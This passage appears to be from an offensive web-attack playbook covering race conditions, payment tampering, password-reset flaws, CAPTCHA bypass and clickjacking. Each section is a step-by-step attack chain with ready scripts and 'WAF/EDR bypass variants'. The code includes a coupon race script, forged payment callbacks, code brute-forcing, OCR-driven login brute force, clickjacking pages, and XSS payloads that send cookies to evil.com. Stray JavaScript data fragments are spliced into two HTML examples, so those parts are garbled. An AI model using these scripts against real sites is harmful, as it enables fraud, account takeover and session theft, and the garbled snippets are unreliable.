_Identify API endpoints involving resource deduction or limited-quantity operations_
```
# Typical race scenarios:
# 1. Coupon claim POST /api/coupon/claim
# 2. Balance withdrawal POST /api/withdraw
# 3. Points exchange POST /api/points/exchange
# 4. Limited-quantity flash sale POST /api/order/create
# 5. Vote/like POST /api/vote
```

**2. 2. Python concurrency test script**
_Use Python asyncio to concurrently send 50 identical requests, detecting whether it can be claimed multiple times_
```
import asyncio
import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("code") == 200)
        print(f"Total: {len(results)}, Success: {success}")

asyncio.run(main())
```

**3. 3. Burp Turbo Intruder test**
_Burp Turbo Intruder's gate mechanism ensures all requests are sent simultaneously_
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    for i in range(50):
        engine.queue(target.req, gate="race1")
    engine.openGate("race1")

def handleResponse(req, interesting):
    if "success" in req.response:
        table.add(req)
```

**4. 4. Verify the race succeeded**
_Query account resources to confirm whether the race condition was successfully exploited_
```
# Check whether the resource was consumed multiple times
GET /api/user/coupons HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# Expected: a 1-coupon-limit actually yields multiple coupons
# Check the balance change
GET /api/user/balance HTTP/1.1
```

**WAF/EDR bypass variants:**

**1. HTTP/2 single-connection concurrency**
_HTTP/2 multiplexing sends multiple concurrent requests within a single TCP connection, bypassing connection-count-based limits_
```
# HTTP/2 multiplexing concurrency over the same connection
curl --http2 --parallel --parallel-max 50 \
  -H "Authorization: Bearer {TOKEN}" \
  -X POST "https://{TARGET}/api/coupon/claim" \
  -d '{"coupon_id":"C001"}' \
  --next --http2 --parallel ...
```

---

### Payment-logic tampering  `biz-payment-tamper`
Manipulate transaction logic by modifying parameters such as amount, quantity, and discount in the payment request. Common in e-commerce platforms and online payment systems, this can lead to 0-yuan purchases, negative prices, discount stacking, and other serious business risks.
Sub-category: **payment security** · tags: `payment` `amount tampering` `business logic` `0-yuan purchase` `e-commerce security`

**Prerequisites:** the target has a payment/order feature; you can intercept and modify HTTP requests

**Attack chain:**

**1. 1. Amount-tampering test**
_Modify the price field in the order request to test whether the backend validates the amount_
```
POST /api/order/create HTTP/1.1
Host: {TARGET}
Content-Type: application/json
Authorization: Bearer {TOKEN}

# Original request
{"product_id": "P001", "quantity": 1, "price": 9900}

# Tampered to 1 cent
{"product_id": "P001", "quantity": 1, "price": 1}

# Tampered to 0 yuan
{"product_id": "P001", "quantity": 1, "price": 0}

# Negative amount (refunded to account)
{"product_id": "P001", "quantity": 1, "price": -100}
```

**2. 2. Quantity and shipping tampering**
_Test quantity boundary values, shipping-fee tampering, and discount overflow_
```
# Quantity of 0 or negative
{"product_id": "P001", "quantity": 0, "price": 9900}
{"product_id": "P001", "quantity": -1, "price": 9900}

# Modify the shipping fee
{"product_id": "P001", "quantity": 1, "shipping_fee": -500}

# Oversized discount
{"product_id": "P001", "quantity": 1, "discount": 9999}
```

**3. 3. Coupon stacking and substitution**
_Test whether coupons can be stacked or substituted with a high-value coupon_
```
# Stack multiple coupons
{"product_id": "P001", "coupons": ["C001", "C002", "C003"]}

# Substitute a high-value coupon ID
{"product_id": "P001", "coupon_id": "INTERNAL_VIP_100OFF"}

# Modify the discount-amount field
{"product_id": "P001", "coupon_discount": 9900}
```

**4. 4. Payment-callback tampering**
_Forge the payment platform's callback notification, tampering with the payment status and amount_
```
# Simulate a successful payment callback
POST /api/payment/callback HTTP/1.1
Host: {TARGET}
Content-Type: application/x-www-form-urlencoded

order_id=ORD20240001&status=SUCCESS&amount=1&sign=tampered_sign

# Modify the amount in the callback
order_id=ORD20240001&status=SUCCESS&amount=1&trade_no=FAKE123456
```

**WAF/EDR bypass variants:**

**1. Scientific-notation bypass**
_Use scientific notation, floating-point precision, and type confusion to bypass amount validation_
```
# Scientific notation
{"price": 1e-10}
# Floating-point precision
{"price": 0.000000001}
# String type confusion
{"price": "0.01"}
# Unicode digit
{"price": "\uff10"}
```

---

### Password-reset logic flaws  `biz-password-reset`
Logic vulnerabilities in the password-reset flow, including reset-token leakage, verification-code brute force, response manipulation, Host-header injection, and other attack techniques, enabling arbitrary user password reset.
Sub-category: **authentication flaws** · tags: `password reset` `authentication bypass` `business logic` `CAPTCHA` `Host injection`

**Prerequisites:** the target has a password-reset/recovery feature; you can intercept HTTP requests

**Attack chain:**

**1. 1. Host-header injection to steal the reset link**
_Modify the Host header so the link in the reset email points to the attacker's server, stealing the reset token_
```
POST /api/password/reset HTTP/1.1
Host: evil-server.com
X-Forwarded-Host: evil-server.com
Content-Type: application/json

{"email": "victim@target.com"}

# The reset link the victim receives becomes:
# https://evil-server.com/reset?token=abc123
```

**2. 2. Verification-code brute force**
_Brute-force a 4-6 digit verification code, testing whether there is a rate limit_
```
# 4-digit verification code brute force
for code in $(seq -w 0000 9999); do
  response=$(curl -s -X POST "https://{TARGET}/api/verify-code" \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"13800138000\",\"code\":\"$code\"}")
  if echo "$response" | grep -q "success"; then
    echo "[+] Code found: $code"
    break
  fi
done
```

**3. 3. Response-manipulation bypass**
_Intercept and modify the server response; the frontend may rely only on the response status_
```
# Original failure response
{"code": 400, "message": "CAPTCHA incorrect"}

# Intercept and modify to success
{"code": 200, "message": "Verification succeeded", "token": "reset_token_here"}

# Some frontends only check the code field before allowing the subsequent operation
```

**4. 4. Weak randomness of the reset token**
_Analyze the reset-token generation algorithm to check whether it is based on predictable factors_
```
# Collect multiple reset tokens to analyze the pattern
token1: 1707811200_user1  (timestamp+username)
token2: 1707811260_user2

# Predictable token generation
import hashlib
token = hashlib.md5(f"{timestamp}_{email}".encode()).hexdigest()

# Construct the reset token using known information
predicted = hashlib.md5(b"1707811200_victim@target.com").hexdigest()
```

**WAF/EDR bypass variants:**

**1. Multi-Host-header bypass**
_Try to override the domain in the reset link using multiple HTTP-header injection methods_
```
# Double Host header
Host: target.com
Host: evil.com

# Absolute-URL override
POST https://evil.com/api/password/reset HTTP/1.1
Host: target.com

# X-Forwarded series
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Original-URL: https://evil.com/reset
```

---

### CAPTCHA bypass techniques  `biz-captcha-bypass`
Various techniques to bypass human-verification mechanisms such as graphical CAPTCHAs, SMS verification codes, and slider verification, including response leakage, reuse attacks, OCR recognition, and logic-flaw exploitation.
Sub-category: **CAPTCHA security** · tags: `CAPTCHA` `CAPTCHA` `bypass` `SMS code` `human verification`

**Prerequisites:** the target has a CAPTCHA-protected feature; a Python environment

**Attack chain:**

**1. 1. CAPTCHA response leakage**
_Check whether the response body, headers, or cookies leak the CAPTCHA plaintext or its encoded value_
```
# Check whether the response contains the CAPTCHA
POST /api/send-sms HTTP/1.1
Host: {TARGET}
Content-Type: application/json

{"phone": "13800138000"}

# The response may leak
{"code": 200, "captcha": "8462", "message": "Sent successfully"}
# Or in a response header
X-Captcha-Code: 8462
Set-Cookie: captcha=ODQ2Mg==  (base64 of 8462)
```

**2. 2. CAPTCHA reuse attack**
_The CAPTCHA is not invalidated after use, and the same CAPTCHA can be reused repeatedly_
```
# Step 1: normally obtain and enter the correct CAPTCHA
POST /api/login
{"username": "test", "password": "test123", "captcha": "8462", "captcha_id": "abc"}

# Step 2: use the same captcha_id and CAPTCHA to try repeatedly
POST /api/login
{"username": "admin", "password": "admin123", "captcha": "8462", "captcha_id": "abc"}

# If the CAPTCHA is not invalidated after use, it can be reused indefinitely
```

**3. 3. Delete the CAPTCHA parameter**
_Test whether the backend still validates when the CAPTCHA parameter is not sent, sent empty, or sent null_
```
# Original request (with CAPTCHA)
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass", "captcha": "1234"}

# Delete the CAPTCHA field
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass"}

# Empty-value test
{"username": "admin", "password": "pass", "captcha": ""}
{"username": "admin", "password": "pass", "captcha": null}
```

**4. 4. Universal CAPTCHA**
_Test for a universal CAPTCHA or debug backdoor left by developers_
```
# Common universal/debug CAPTCHAs
0000
1111
1234
8888
9999
6666
000000
123456

# Test the endpoint's debug backdoor
{"phone": "13800138000", "code": "000000", "debug": true}
{"phone": "13800138000", "code": "master_code"}
```

**WAF/EDR bypass variants:**

**1. OCR automatic recognition of graphical CAPTCHAs**
_Use the ddddocr library to automatically recognize graphical CAPTCHAs, integrated into the brute-force flow_
```
import ddddocr
import requests

ocr = ddddocr.DdddOcr()

def solve_captcha(target):
    # Fetch the CAPTCHA image
    resp = requests.get(f"https://{target}/captcha/image")
    code = ocr.classification(resp.content)
    return code

# Integrate into the brute-force script
for pwd in passwords:
    captcha = solve_captcha("{TARGET}")
    r = requests.post(f"https://{TARGET}/api/login",
        json={"user":"admin","pass":pwd,"captcha":captcha})
    if "success" in r.text:
        print(f"[+] Password: {pwd}")
```

---

### · Clickjacking

### Basic clickjacking  `clickjacking-basic`
Use a transparent iframe overlay to trick the user into unknowingly clicking a hidden malicious button or link
Sub-category: **basic** · tags: `clickjacking` `ui-redressing` `iframe`

**Prerequisites:** the target site allows being nested in an iframe; the target does not set the X-Frame-Options response header; the target does not configure a CSP frame-ancestors policy; basic HTML/CSS knowledge

**Attack chain:**

**1. Detect X-Frame-Options and CSP**  _[linux]_
_Check whether the target sets anti-clickjacking security headers_
```
curl -sI "http://target.com" | grep -iE "x-frame-options|content-security-policy|frame-ancestors"

# Batch detection:
for url in $(cat urls.txt); do
  echo -n "$url: "
  xfo=$(curl -sI "$url" | grep -i "x-frame-options")
  csp=$(curl -sI "$url" | grep -i "frame-ancestors")
  [ -z "$xfo" ] && [ -z "$csp" ] && echo "VULNERABLE" || echo "Protected: $xfo $csp"
done
```

**2. Basic transparent-iframe overlay PoC**
_Construct a decoy page that overlays the target's sensitive-operation page with a transparent iframe on top of the decoy button_
```
<html>
<head><title>Win a Prize!</title>
<style>
  #target-frame {
    position: absolute; top: 0; left: 0;
    width: 500px; height: 500px;
    opacity: 0.0001; /* almost fully transparent */
    z-index: 2; border: none;
  }
  #decoy-btn {
    position: absolute; top: 120px; left: 50px;
    z-index: 1; padding: 15px 30px;
    font-size: 20px; cursor: pointer;
    background: #4CAF50; color: white;
    border: none; border-radius: 5px;
  }
</style></head>
<body>
  <h1>Congratulations! You Won!</h1>
  <p>Click the button to claim your prize:</p>
  <button id="decoy-btn">Claim Prize</button>
  <iframe id="target-frame" src="http://target.com/account/delete"></iframe>
</body></html>
```

**3. Multi-step drag-and-drop hijacking (Drag-and-Drop)**
_Use the HTML5 drag-and-drop API to achieve cross-origin data-extraction clickjacking_
```
<html>
<head><style>
  #source { width:200px; height:50px; background:#eee; text-align:center; line-height:50px; }
  #target-frame { position:absolute; top:0; left:0; width:600px; height:400px; opacity:0.0001; z-index:10; }
</style>
<script>
  // Listen for drag events; can extract data cross-origin
  document.addEventListener("drag", function(e) {
    console.log("Dragging:", e.dataTransfer.getData("text"));
  });
</script></head>
<body>
  <div id="source" draggable="true">Drag this to win!</div>
  <div id="drop-zone" style="width:200px;height:200px;border:2px dashed #ccc;margin-top:20px;">Drop Here</div>
  <iframe id="target-frame" src="http://target.com/profile" sandbox="allow-scripts allow-forms"></iframe>
</body></html>
```

**4. Exploiting CSS pointer-events bypass**
_Use pointer-events:none so the overlay does not intercept clicks; clicks pass through directly to the underlying iframe_
```
<style>
  .overlay { pointer-events: none; position: absolute; z-index: 100; }
  iframe { pointer-events: auto; position: absolute; opacity: 0; }
</style>
<div class="overlay">
  <h1>Survey: Rate Our Service</h1>
  <p>Select your rating below:</p>
  <!-- decoy content does not intercept mouse events at all -->
  <div style="display:flex; gap:20px; margin-top:50px;">
    <span style="font-size:40px">⭐</span>
    <span style="font-size:40px">⭐⭐</span>
    <span style="font-size:40px">⭐⭐⭐</span>
  </div>
</div>
<iframe src="http://target.com/admin/grant-role?role=admin&user=attacker" style="width:100%;height:100%;border:none;"></iframe>
```

**WAF/EDR bypass variants:**

**1. iframe sandbox attribute bypass**
_Bypass some frame-busting scripts via a combination of the iframe sandbox attribute's allow-top-navigation and allow-scripts_
```
<iframe src="https://target.com" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>

<!-- Use sandbox allow-top-navigation to bypass -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation allow-forms"></iframe>

<!-- Use sandbox+srcdoc to bypass -->
<iframe srcdoc="<script>top.location='https://target.com'</script>" sandbox="allow-scripts allow-top-navigation"></iframe>
```

**2. X-Frame-Options ALLOW-FROM inconsistency**
_X-Frame-Options ALLOW-FROM behaves inconsistently across browsers; Chrome/Safari completely ignore this directive_
```
<!-- Exploit inconsistent browser support for ALLOW-FROM -->
<!-- Chrome/Safari ignore ALLOW-FROM; only CSP frame-ancestors takes effect -->

<!-- Double iframe to bypass frame-busting -->
<iframe src="data:text/html,<iframe src='https://target.com'></iframe>"></iframe>

<!-- Use window.name to bypass -->
<iframe src="attacker-page.html" name="payload_data"></iframe>
```

**3. Double-nested iframe bypass**
_Use a double-nested iframe so the top reference in frame-busting scripts points to the intermediate page rather than the attack page_
```
<!-- Double nesting to bypass frame-busting -->
<iframe src="middle-page.html"></iframe>

<!-- middle-page.html content -->
<html><body>,
          syntaxBreakdown: [
            { part: '<script>', explanation: { zh: 'Script tag', en: 'Scripttag' }, type: 'tag' },
            { part: '<iframe>', explanation: { zh: 'Inline frame', en: 'Inline frame (iframe)' }, type: 'tag' }
          ]
<iframe src="https://target.com" sandbox="allow-forms"></iframe>
</body></html>

<!-- onbeforeunload blocks navigation -->
<script>window.onbeforeunload=function(){return "x";}</script>
<iframe src="https://target.com"></iframe>
```

---

### Clickjacking + XSS  `clickjacking-xss`
Combine clickjacking with an XSS attack: first trigger the XSS attack vector via clickjacking to gain deeper control
Sub-category: **XSS** · tags: `clickjacking` `xss`

**Prerequisites:** the target has an XSS vulnerability; the target allows being nested in an iframe; the XSS payload can be triggered by a click

**Attack chain:**

**1. Identify an exploitable XSS and clickjacking combination**
_Detect both the target's clickjacking and XSS vulnerabilities_
```
# 1. Detect iframe-nesting protection
curl -sI "http://target.com" | grep -i "x-frame-options|frame-ancestors"

# 2. Detect a known XSS point
curl -s "http://target.com/search?q=<script>alert(1)</script>" | grep -i "script"

# 3. Detect Self-XSS (requires user interaction)
curl -s "http://target.com/profile/edit" -d "bio=<img+src=x+onerror=alert(document.cookie)>"
```

**2. Self-XSS + Clickjacking combined exploitation**
_Use multi-step clickjacking to trigger Self-XSS — first guide the user to click the edit button, then induce pasting the XSS payload_
```
<html><head>
<style>
  iframe { position:absolute; top:0; left:0; width:800px; height:600px; opacity:0.0001; z-index:10; }
  .step { position:absolute; z-index:1; }
</style>
<script>
var step = 0;
function nextStep() {
  step++;
  if (step === 1) {
    // Step 1: induce the user to click the "profile edit" button
    document.getElementById("msg").innerText = "Step 1: Click to claim reward!";
  } else if (step === 2) {
    // Step 2: induce the user to click the input field
    document.getElementById("msg").innerText = "Step 2: Click to verify identity!";
  } else if (step === 3) {
    // Step 3: induce pasting (Ctrl+V), executing the XSS
    document.getElementById("msg").innerText = "Step 3: Press Ctrl+V to paste verification code!";
    navigator.clipboard.writeText('<img src=x onerror="fetch('https://evil.com/steal?'+document.cookie)">');
  }
}
</script></head>
<body onload="nextStep()">
  <h1 id="msg">Loading prize...</h1>
  <button class="step" onclick="nextStep()" style="top:200px;left:100px;">Next Step</button>
  <iframe src="http://target.com/profile/edit"></iframe>
</body></html>
```

**3. Reflected XSS + iframe-nesting exploitation**
_Load a URL containing the XSS payload via an iframe, using clickjacking to trigger an XSS that requires user interaction_
```
<html><head>
<style>
  iframe { width:100%; height:100%; position:absolute; top:0; left:0; opacity:0; border:none; }
</style></head>
<body>
  <h1>Free WiFi Login</h1>
  <p>Please click "Connect" to access free WiFi</p>
  <button style="padding:15px 40px; font-size:18px; margin-top:20px;">Connect</button>
  <!-- iframe loads a URL containing XSS, button position precisely aligned to trigger XSS -->
  <iframe src="http://target.com/page?callback=<script>document.location='https://evil.com/steal?c='+document.cookie</script>"></iframe>
</body></html>
```

**WAF/EDR bypass variants:**

**1. CSP frame-ancestors bypass**
_Use data:/blob: URIs and the srcdoc attribute to bypass the frame-ancestors directive's restriction on iframe content in the CSP_
```
<!-- Use a data: URI to bypass CSP (old browsers) -->
<iframe src="data:text/html,<script>alert(document.domain)</script>"></iframe>

<!-- blob: URI bypass -->
<script>
var blob = new Blob(['<script>alert(1)<\/script>'], {type: 'text/html'});
document.getElementById('frame').src = URL.createObjectURL(blob);
</script>

<!-- srcdoc attribute bypass -->
<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
```

**2. Exploiting sandbox-attribute misconfiguration**
_Escape the sandbox via the combination of allow-scripts and allow-same-origin in the sandbox attribute, or via allow-popups-to-escape-sandbox_
```
<!-- sandbox allow-scripts permits executing JS -->
<iframe src="https://target.com" sandbox="allow-scripts allow-same-origin">
</iframe>,
          syntaxBreakdown: [
            { part: '<script>', explanation: { zh: 'Script tag', en: 'Scripttag' }, type: 'tag' },
            { part: '<iframe>', explanation: { zh: 'Inline frame', en: 'Inline frame (iframe)' }, type: 'tag' },
            { part: 'alert()', explanation: { zh: 'Popup function', en: 'Alert function' }, type: 'function' }
          ]

<!-- Use allow-popups to escape -->
<iframe src="https://target.com" sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox">
</iframe>

<!-- allow-top-navigation + clickjacking -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation-by-user-activation">
</iframe>
```

**3. Drag-and-drop hijacking to inject XSS**
_Use the HTML5 drag-and-drop API to drag an XSS payload from the attack page into an editable area in the target iframe_
```
<!-- Drag-and-drop hijacking to inject the XSS payload into the target page -->
<style>
#drag { position: absolute; z-index: 1; opacity: 0; }
#target { position: absolute; z-index: 0; }
</style>

<div id="drag" draggable="true"
  ondragstart="event.dataTransfer.setData('text/html','<img src=x onerror=alert(1)>')">
  Drag me
</div>

<iframe id="target" src="https://target.com/page-with-editable-field"
  sandbox="allow-scripts allow-same-origin">
</iframe>
```

---
